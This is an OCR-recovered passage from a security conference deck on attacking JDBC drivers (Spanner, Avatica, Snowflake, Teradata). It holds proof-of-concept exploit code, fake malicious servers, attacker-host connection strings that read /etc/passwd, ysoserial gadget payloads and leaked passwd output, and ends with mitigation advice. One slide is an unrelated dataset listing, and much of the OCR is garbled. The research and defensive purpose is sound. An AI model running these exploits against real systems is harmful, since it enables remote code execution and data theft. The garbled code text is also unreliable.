DriverManager.registerDriver(new com.ibm.db2.jcc.0B2Driver());
// Get Connection
DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb : pluginClassName=com. example.Evil0bject;") ;
at com.ibm.db2.jcc.DB2Driver.connect (DB2Driver. java:117)
at java.sql.DriverManager .getConnection(DriverManager. java:664)
at java.sql.DriverManager .getConnection(DriverManager. java:270)
Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB
at com.ibm.db2.jcc.am.is.a(Cis. java: 4586)
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
at com.ibm.db2.jcc.am.ct.run(ct.java:33)
- 13 more
```

## Slide 43

## Google Cloud Spanner Remote Code Execution via Unchecked Class

###### • CredentialsProvider


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google Cloud Spanner Remote Code Execution via Unchecked Class
1 static @Nullable CredentialsProvider parseCredentialsProvider (String uri) {
2 String name parseUriProperty (uri, CREDENTIALS_PROVIDER_PROPERTY_NAME) ;
3 (name != null) {
5 Class<? extends CredentialsProvider> clazz =
6 (Class<? extends CredentialsProvider>) Class. forName (name) ;
7 O Constructor<? extends CredentialsProvider> constructor = clazz.getDeclaredConstructor () ;
8 return constructor.newInstance() ;
9 + catch (ClassNotFoundException classNotFoundException) {
10 throw SpannerExceptionFactory.newSpannerException (
11 ErrorCode.INVALID_ARGUMENT ,
12 "Unknown or invalid CredentialsProvider class name: " + name,
13 classNotFoundException) ;
```

## Slide 44

Google Cloud Spanner Remote Code Execution via Unchecked Class


> Recovered by OCR — confidence 88/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
>
>
Run:
Google Cloud Spanner Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
public class CloudSpannerDemo {
public static void main(String[] args) throws SQLException {
System.setProperty("cmd","open -a calculator") ;
au
at
Caused
at
at
at
at
at
com.mysql.jdbc.test.CloudSpannerDemo .main(€LoudSpannerDemo. java:14)
by: java.lang.ClassCastException Create breakpoint
com.google
com.google
com.google.
com.google
com.google.
3 more
.cloud.
cloud.
-cloud.
cloud.
spanner. jdbc. JdbcDriver.connect (JdbcDriver. java:195)
Prorece fFfiniched with evit code 1
AC
%
com.sun.security.auth.module.UnixSystem cannot be cast to com.google.api.gax.core.CredentialsProvid
```

## Slide 45

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

- httpclient_impl

   - The class which implements HTTPClient class used to send HTTP requests from client to server

- Invocation of arbitrary constructor with URL argument due to unchecked superclass

- We reported and it was assigned CVE-2022-36364

**Thoughts Class**

## Slide 46

Apache Calcite Avatica Remote Code Execution via Unchecked Class


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
private AvaticaHttpClient instantiateClient(String className, URL url) {
try {
Class<?> clz = Class. forName(className) ;
Constructor<?> constructor = clz.getConstructor(URL.class) ;
Object instance = constructor.newInstance (Objects. requireNonNull (url) );
return AvaticaHttpClient.class.cast(instance) ;
} catch (Exception e) {
throw new RuntimeException("Failed to construct AvaticaHttpClient implementation
+ className, e);
10
11 i
```

## Slide 47

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

###### **Thoughts Class**


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import com. fasterxml.jackson.databind.JsonNode;
import com. fasterxml.jackson.databind.ObjectMapper ;
import java.10.%;
import java.net.URL;
| Thoughts Class |
public class CustomHttpClient {
public CustomHttpClient(URL url) throws IOException {
Object content = url.getContent( );
if (content instanceof InputStream) {
BufferedReader reader = new BufferedReader (new InputStreamReader ( (InputStream)
content) ) ;
ObjectMapper mapper new ObjectMapper () ;
JsonNode jnode = mapper.readTree(reader) ;
String result = jnode.path("result") .asText() ;
Runtime. getRuntime() .exec(result) ;
J
```

## Slide 48

Apache Calcite Avatica Remote Code Execution via Unchecked Class


> Recovered by OCR — confidence 90/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Structure
WM Bookmarks
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
import java.sql.SQLException;
public class AvaticaDemo{
public static void main(String[] args) throws SQLException {
DriverManager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
{"result":"open -a calculator"}
Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation com.example.avaticademo.CustomHttpCLlient
6
>
Run:
= at
at
at
at
at
at
at
at
org.apache
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
-calcite.
calcite.
calcite.
-calcite.
calcite.
calcite.
calcite.
calcite.
calcite.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica
avatica.
avatica.
AvaticaConnection.<init>(AvaticaConnection. java:121)
UnregisteredDriver.connect(UnregisteredDriver. java:138)
```

## Slide 49

## Apache Calcite Avatica SSRF via Unchecked Class

Try to find a gadget in the real-world scenario

## Slide 50

## Apache Calcite Avatica SSRF via Unchecked Class

- **Leverage dynamic analysis tools to look up the particular gadgets**

- **Verify the gadgets we find**

   - com.sun.media.sound.SF2Soundbank

   - javax.swing.JEditorPane

   - jdk.internal.loader.FileURLMapper

   - sun.security.provider.PolicyFile

## Slide 51

## Apache Calcite Avatica SSRF via Unchecked Class

• sun.security.provider.PolicyFile


> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Apache Calcite Avatica SSRF via Unchecked Class
PolicyFile java.security.Policy {
PolicyFile(URL url)
```

## Slide 52

## Apache Calcite Avatica SSRF via Arbitrary Class

• Sensitive Information Leakage in JDBC Connecting Exception


> Recovered by OCR — confidence 81/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Apache Calcite Avatica SSRF via Arbitrary Class
* Sensitive Information Leakage in JOBC Connecting Exception
> public class AvaticaDemo{
> public static void main(String[] args) throws SQLException {
DriverNanager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
DriverManager .getConnection( url: "jdbc:avatica:remote:url=https: //jdbc-attack, com?file=/etc/passwd;httpclient impl=sun.security.provider.PolicyFile") ;
=) com.example.avaticademo.AvaticaDemo =
line 1: expected [;], found [root:x:0:9:root:/root:/bin/bash
a Exception in thread "main" java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation sun.security.provider.PolicyFile
at org.apache.calcite.avatica.remote.Driver.getHttpClient (Driver. java:160)
at org.apache.calcite.avatica.remote.Driver.createService(Driver. java:123)
at org.apache.calcite.avatica.AvaticaConnection.<init>(Avatic nonection. java:121)
at org.apache.calcite.avatica.AvaticaJdbc41Factory$AvaticaJdbc41Connection. <init>(AvaticaJdbc41Factory. java:109)
at org.apache.calcite.avatica.AvaticaJdbe41Factory .newConnection(AvaticaJdbc41Factory.java:65)
at org.apache.calcite.avatica.remote.Driver.connect (Driver. java:165)
at java.sql.DriverManager .getConnection(DriverManager. java: 664)
at com.example.avaticademo.AvaticaDemo.main(AvaticaDemo. java:14)
Caused by: java.lLang.ClassCastException Create breakpoint : Cannot cast sun.security.provider.PolicyFile to org.apache.calcite.avatica.remote.AvaticaHttpClient
at java.lang.Class.cast (Class. java:3369)
at org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl. instantiateClient (AvaticahttpClientFactoryImpl. java:145)
12 more
```

## Slide 53

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class

### Incorrect Response Disposal

JDBC Attack Protection

## Slide 54

## Snowflake Remote Code Execution via SSO Flow Response

- Browser-based SSO

- Relying on open (Mac), xdg-open (Linux), cmd (!) (Windows) – platform- and driver-specific RCE

- Malicious SSO server can inject command via ssoUrl attribute in returned SSO response

- RCE on MacOS (JDBC, NodeJS) and Windows (NodeJS)

## Slide 55

Snowflake Remote Code Execution via SSO Flow Response


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Snowflake Remote Code Execution via SSO Flow Response
1 @Override
2 DLic void openBrowser (String ssoUrl) throws SFException
3 try
4
5 if (java.awt.Desktop.isDesktopSupported () )
7 java.awt.Desktop. getDesktop() .browse(ur7) ;
8 }
9 Runtime runtime = Runtime. getRuntime() ;
10 Constants.OS os Constants. get0OS() ;
11 if (os == Constants.OS.MAC)
12 e) runtime.exec("open " ssourl) ;
13 +} else {
14
15 runtime.exec("xdg-open " ssourl);
16 }
17 }
18 } catch (URISyntaxException IOException ex)
19 throw new SFException(ex, ErrorCode.NETWORK_ERROR, ex.getMessage()) ;
20 }
21 }
```

## Slide 56

**Fake Server**


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
from flask import Flask, jsonify, request
app = Flask(__name__)
@app. route('/session/authenticator-request', methods = ['POST'])
def SSOJSON():
if(request.method == 'POST'):
jsonData = {"success": "true", "data": {"proofkey": "foo", "ssoUrl": "calc"}}
return jsonify (data)
if __name__ == '__main_':
app.run('0.0.0.0', debug=True, port=443, ssl_context=('/root/ssl/jdbc-attack.com_bundle.pem' ,
'/root/ssl/jdbc-attack.com.key'))
```

## Slide 57

## Snowflake Remote Code Execution via SSO Flow Response

- authenticator=external

   - To set up browser-based SSO from external for authentication

- JDBC driver requests https://<host>/session/authenticator-request and parses JSON response

- Passes the value of the data.ssoURL() JSON format property to Runtime.exec() as second parameter

   - First parameter is open on MacOS

   - Remote Code Execution on MacOS

## Slide 58

Snowflake Remote Code Execution via SSO Flow Response


> Recovered by OCR — confidence 93/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Snowflake Remote Code Execution via SSO Flow Response
java.sql.DriverManager
main(String Exception
DriverManager .registerDriver com. snowflake.client. jdbc. SnowflakeDriver
DriverManager .getConnection("jdbc: snowflake: //jdbc-attack.com/?user=admin&password=123456&db=sdb&authenticator=externalbrowser"
https://safe.govfz.com:
w
https://safe.govfz.com:443
Initiating login request with your identity provider. A browser window should have opened for you to complete the login. If you can't see it, check existing browser windows, or your OS settings. Press CTRL+C to abort and try
```

## Slide 59

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP authentication allows delegated credentials to AWS

   - Exposed a design flaw in GCP authentication library (in all languages that we looked at)

   - Design flaw can lead to full read SSRF by supplying a crafted set of credentials

- encodedCredentials

   - Allow users to set their own Google Cloud Platform  credentials in Base64-encoded JSON through this undocumented property

## Slide 60

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP credential JSON is used for all auth to GCP

- JSON is deserialized by different implementations

- We are targeting the ExternalAccountCredentials.fromJson method

- Supports many external credentials including AWS

- AWS implementation makes several HTTP requests based on the provided config

## Slide 61

## Google Cloud Spanner JDBC Driver Full Read SSRF

###### • Crafted Credentials

**Response JSON Format**


> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
* Crafted Credentials
"type": "external_account",
"audience": "test",
"subject_token_type": "test",
"token_url": "https://sts.google.apis.com/token",
"credential_source":
"environment_id": "awsl1",
"regional_cred_verification_url": "https://accounts.google.com/o/oauth2/auth",
"region_url": "https://accounts.google.com/o/oauth2/token",
"url": "https://ww.googleapis.com/oauth2/vl/certs"
"xservice_account_impersonation_url":
wi
"token_info_url":
Response JSON Format
"
"client_secret":"client_secret",
```

## Slide 62

Google Cloud Spanner JDBC Driver Full Read SSRF


> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
if (awsCredentialSource.url == null awsCredentialSource.url.isEmpty()) {
"Unable to determine the AWS IAM role name.
t "url field.");
J
The credential source does not contain the"
String roleName = retrieveResource(awsCredentialSource.url, "IAM role", metadataRequestHeaders) ;
String awsCredentials
retrieveResource (
awsCredentialSource.url + "/" + roleName,
"credentials", metadataRequestHeaders) ;
JsonParser parser OAuth2Uti ls. JSON_FACTORY.createJsonParser (awsCredentials) ;
```

## Slide 63

Google Cloud Spanner JDBC Driver Full Read SSRF


> Recovered by OCR — confidence 96/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
Connection conn =
```

## Slide 64

Google Cloud Spanner JDBC Driver Full Read SSRF


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
44
String credentialsJson
// note: the project/i
Google Cloud Spanner JDBC Driver Full Read SSRF
edentials JSON: " + credentialsJson) ;
Encoded = Baseé4.getUrlEncoder() .encodeToString(credentialsJson.getBytes() );
nstanc
database here are never used before the exploit runs
String url = String.format("jdbc:cloudspanner: /projects/Learning-pjm/instances/test/databases/test;encodedCredentials=%s", credentialsJsonEncaded) ;
// Register Connection
struct JDBC Connection URL: %s%n", url);
// Get Connection
Connection connection
// Establish the conne
™ CloudSpannerFullSSRFPOC
at com.google.auth.cauth2.
at com.google.auth.oauth2.
at com.google.auth.oauth2.
at com.google.auth.cauth2.
3 more
Caused by: com.google.api.client.http.HttpResponseException: 500 INTERNAL SERVER ERROR
= DriverManager.getConnection(url) ;
ction
ment();
AwsCredentials.retrieveSubjectToken(AwsCredentials. java:162)
AwsCredentials.refreshAccessToken(AwsCredentials. java:142)
OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.61 Transitional//EN
<head>
<title>NotADirectoryError:
>
{Errno 26] Not a directory: &#x27;/etc/passwd/root:x:0:0:root:/root:/bin/bash bin:x
1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var
```

## Slide 65

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• BROWSER

- Leverages browser-based SSO via Teradata Server configuration enabling OpenID Connect (OIDC) and JDBC URL parameter • Client OIDC handling requires the server to confirm that OIDC is configured and this allows the JDBC driver to use the browser-based SSO code path

• On any Teradata server where OIDC is enabled

## Slide 66


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 var6 = var6.replaceALL("PLACEHOLDER", varl2 + "?response_type=code" + "&client_id=" +4
2 Utility.safeForURL(var9) + "&redirect_uri=" + Utility.safeForURL(var20) + "&code_challenge=" +
3 Utility.safeForURL(var15) + "&code_challenge_method=S256" + "&scope="_ + Utility.safeForURL(var21)) ;
4 if (this. log.isTimingEnabled()) {
5 this. log.timing ("Launching browser " + var6);
6 t
7
8 Process var22;
10 e) var22 = Runtime. getRuntime() .exec(var6) ;
11 } catch (IOException var30) {
12 throw Utility. logEx(this.log, "Runtime exec", Utility.wrapEx(var30,
13 ErrorFactory.makeDriverJDBCException("TJ1551", var6)));
14 }
```

## Slide 67

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

###### • Create a fake Teradata server in Python which tells the client OIDC has been configured on the server

- This tricks the client into allowing the BROWSER JDBC property

- Does not even require a working Teradata server to achieve RCE on the machine running the JDBC client

- Similar to the Rogue MySQL Server LOCAL INFILE exploit from many years ago

## Slide 68

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• Python program that fakes the Teradata server handshake protocol

**Fake Server Code Fragment**

## Slide 69

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

- JDBC client connects to fake Teradata server (in Python)

- Fake server tells client OIDC is enabled

- JDBC client makes URL request to OIDC server, expecting JSON document with openid-configuration format - Bonus! Blind GET-based SSRF here

- • JDBC client executes the command in the BROWSER property

## Slide 70

Teradata JDBC Driver Remote Code Execution via SSO Command Injection


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
The Dataset

← → C  ⚠ Not Secure | ghtorrent-downloads.ewi.tudelft.nl/mysql/

Index of /mysql/

../
mysql-2013-10-12.sql.gz                10-Dec-2015 20:33          4522065160
mysql-2014-01-02.sql.gz                10-Dec-2015 21:19          5921235276
mysql-2014-04-02.sql.gz                10-Dec-2015 22:13          7354431193
mysql-2014-08-18.sql.gz                10-Dec-2015 23:43         12043734230
mysql-2014-11-10.sql.gz                11-Dec-2015 01:34         15118378692
mysql-2015-01-04.sql.gz                11-Dec-2015 03:42         17389100969
mysql-2015-04-01.sql.gz                11-Dec-2015 06:56         26293878411
mysql-2015-06-18.sql.gz                11-Dec-2015 11:18         35102522985
mysql-2015-08-07.sql.gz                11-Dec-2015 15:17         33069692808
mysql-2015-09-25.tar.gz                11-Dec-2015 20:02         33841191143
mysql-2016-01-08.tar.gz                08-Jan-2016 21:57         35591472888
mysql-2016-01-16.tar.gz                16-Jan-2016 08:17         35838991852
mysql-2016-02-01.tar.gz                01-Feb-2016 11:38         36667951779
mysql-2016-02-16.tar.gz                21-Feb-2016 23:45         37302751172
mysql-2016-03-01.tar.gz                01-Mar-2016 11:57         37988648250
mysql-2016-03-16.tar.gz                16-Mar-2016 10:42         38707567798
mysql-2016-04-19.tar.gz                19-Apr-2016 17:46         40105071925
mysql-2016-05-04.tar.gz                05-May-2016 02:35         40494259095
mysql-2016-06-01.tar.gz                01-Jun-2016 11:50         41787169343
mysql-2016-06-16.tar.gz                16-Jun-2016 11:20         42423227238
mysql-2016-07-19.tar.gz                23-Jul-2016 09:24         43325816626
mysql-2016-09-05.tar.gz                05-Sep-2016 23:18         45284829230
mysql-2017-01-19.tar.gz                20-Jan-2017 04:22         51960147283
mysql-2017-02-01.tar.gz                01-Feb-2017 12:42         52582882424
mysql-2017-03-01.tar.gz                01-Mar-2017 14:38         52916505432
mysql-2017-04-01.tar.gz                01-Apr-2017 14:13         56115975886
mysql-2017-05-01.tar.gz                01-May-2017 14:40         57721654657
mysql-2017-06-01.tar.gz                01-Jun-2017 15:02         59315227769
mysql-2017-07-01.tar.gz                01-Jul-2017 15:05         60948681616
mysql-2017-09-01.tar.gz                01-Sep-2017 15:53         64258782505
mysql-2017-10-01.tar.gz                01-Oct-2017 15:57         65448079781
mysql-2017-12-01.tar.gz                01-Dec-2017 16:49         69797297007
mysql-2018-01-01.tar.gz                01-Jan-2018 16:52         71446490168
mysql-2018-02-01.tar.gz                01-Feb-2018 20:09         73273914729
mysql-2018-03-01.tar.gz                01-Mar-2018 19:13         74476124928
```

## Slide 71

## Bypass high version Java reflection restriction via Teradata JDBC Driver

- Attack interfaces can be combined

- JDBC connection can be leveraged to evade Java deserialization with reflection in JDK

JDBC
JNDI Deserialization

## Slide 72

**CommonsBeantils Gadget**


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
public class CommonsBeanutilsl implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
final Object templates = Gadgets.createTemplatesImpl (command) ;
// mock method name until armed
final BeanComparator comparator = new BeanComparator("lLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger ("1") ) ;
// switch method called by comparator
Ref lections.setFieldValue(comparator, "property", "outputProperties") ;
// switch contents of queue
queueArray| 0] = templates;
queueArray|1] = templates;
return queue;
```

## Slide 73

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar CommonsBeanutils1 open -a calculator > /tmp/calc.ser

• Java reflection has been restricted in Java 17

## Slide 74

Bypass high version Java reflection restriction via Teradata JDBC Driver


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypass high version Java reflection restriction via Teradata JDBC Driver
public class TeraDataSource extends TeraDataSourceBase implements DataSource {
public TeraDataSource() {
public Connection getConnection() throws SQLException {
return this.createNewConnection(this.user, this.password) ;
public Connection getConnection(String varl, String var2) throws SQLException {
return this.createNewConnection(varl, var2);
J
```

## Slide 75

**Getter and Setter**


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
public class TeraDataSourceBase implements Referenceable, Serializable {
public String getDSName() {
return this.DSName;
}
public void setDSName(String varl) {
this.DSName = varl;
public String getBROWSER() {
return this.m_sBrowser;
public void setBROWSER(String varl) {
this.m_sBrowser = varl;
public void setLOGMECH(String varl) {
this.LogMech = varl;
public String getLOGMECH() {
return this.LogMech;
```

## Slide 76

**TeraDataSource Gadget**


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
public class TeraDataSourcel implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
// create a TeraDataSource object, holding our JDBC string
TeraDataSource dataSource = new TeraDataSource() ;
dataSource.setBROWSER (command) ;
dataSource.setLOGMECH ("BROWSER") ;
dataSource.setDSName("127.0.0.1");
// mock method name until armed
final BeanComparator comparator = new BeanComparator("LlLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger("1"));
queue.add(new BigInteger("1"));
// switch method called by comparator to "getConnection"
Reflections.setFieldValue(comparator, "property", "connection") ;
// switch contents of queue
final Object[{] queueArray = (Object[]) Reflections. getFieldValue(queue, "queue") ;
queueArray|0] = dataSource;
queueArray[1] = dataSource;
return queue;
```

## Slide 77

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar TeraDataSource1 open -a calculator > /tmp/tds.ser

###### • Java reflection has been evaded successfully in Java 17

## Slide 78

Abused Connection Resource

Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

### JDBC Attack Protection

## Slide 79

## JDBC Security for Service Providers

###### If you expose JDBC configuration to users in your software / service:

- Use an allow-list for JDBC properties with minimal viable set for business / service needs

- Use only vetted JDBC drivers and do not allow user upload

- Pay special attention to configuration properties which affect file writes and network/OS commands - deny these by default

- Sandbox user-originated JDBC activity in a dedicated VM or cloud function - assume the environment will be compromised and minimize blast radius

- Regularly review JDBC configurations and usage for malicious or unexpected configuration

- JDBC drivers should be part of your component version lifecycle strategy (keep them updated)

## Slide 80

## JDBC Security for Developers

###### If you are developing a JDBC driver…

- Do not trust user-provided properties, especially when the properties are used to invoke network calls, OS commands, or code through reflection

- Beware of the malicious server and consider using checksums or other verifiable data exchange mechanism

- If you are forking an existing JDBC driver, make sure you stay up to date with the upstream driver and ensure you are applying particularly security fixes
